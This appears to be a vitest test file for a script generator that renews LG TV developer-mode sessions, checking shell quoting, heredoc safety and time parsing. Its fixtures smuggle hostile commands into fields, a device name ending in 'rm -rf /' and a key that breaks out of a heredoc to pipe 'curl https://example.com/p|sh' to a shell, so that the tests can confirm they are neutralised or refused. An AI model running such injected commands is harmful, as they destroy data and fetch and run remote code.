import { describe, expect, it } from 'vitest';
import type { SavedDevice } from '../../devices/store';
import { fmtCountdown, parseRemaining, renewScript, resetUrl } from './renewScript';

const dev = (over: Partial<SavedDevice> = {}): SavedDevice => ({
  id: 'x',
  name: "Kid's TV; rm -rf /",
  mode: 'devmode',
  host: '192.0.2.10',
  port: 9922,
  username: 'prisoner',
  auth: { kind: 'key', privateKey: '-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----\n', passphrase: "A1'B2" },
  createdAt: 0,
  updatedAt: 0,
  ...over,
});

describe('renew script', () => {
  it('quotes every value and slugs the name used in file names', () => {
    const s = renewScript(dev())!;
    expect(s).toContain("DEVICE_NAME='Kid-s-TV-rm--rf'");
    expect(s).toContain("DEVICE_PASSPHRASE='A1'\\''B2'");
    expect(s).toContain("DEVICE_HOST='192.0.2.10'");
    expect(s).toContain("<<'END_OF_PRIVKEY'\n-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----\nEND_OF_PRIVKEY");
  });

  it('refuses a key that could break out of the heredoc', () => {
    const evil = '-----BEGIN RSA PRIVATE KEY-----\nabc\nEND_OF_PRIVKEY\ncurl https://example.com/p|sh\n-----END RSA PRIVATE KEY-----';
    expect(renewScript(dev({ auth: { kind: 'key', privateKey: evil } }))).toBeNull();
    // Windows line endings are fine.
    const crlf = '-----BEGIN RSA PRIVATE KEY-----\r\nabc\r\n-----END RSA PRIVATE KEY-----\r\n';
    expect(renewScript(dev({ auth: { kind: 'key', privateKey: crlf } }))).not.toContain('\r');
  });

  it('needs a key login', () => {
    expect(renewScript(dev({ auth: { kind: 'password', password: 'x' } }))).toBeNull();
  });

  it('builds the renew URL and parses LG’s time', () => {
    expect(resetUrl('ABC123')).toBe('https://developer.lge.com/secure/ResetDevModeSession.dev?sessionToken=ABC123');
    expect(parseRemaining('742:15:03')).toBe(((742 * 60 + 15) * 60 + 3) * 1000);
    expect(parseRemaining('soon')).toBeNull();
    expect(fmtCountdown(((742 * 60 + 15) * 60 + 3) * 1000)).toBe('742:15:03');
    expect(fmtCountdown(-5)).toBe('00:00:00');
  });
});
